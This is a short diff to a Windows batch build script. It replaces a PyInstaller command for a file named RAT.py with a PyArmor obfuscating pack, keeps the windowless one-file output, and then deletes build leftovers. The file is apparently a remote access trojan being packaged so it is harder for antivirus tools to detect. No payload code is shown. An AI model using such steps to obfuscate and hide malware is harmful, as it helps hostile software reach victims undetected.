@@ -1,6 +1,6 @@
 echo off
 
-pyinstaller --clean --onefile --noconsole RAT.py
+pyarmor pack -e " --onefile --noconsole" RAT.py
 
 del /s /q /f RAT.spec
 rmdir /s /q __pycache__
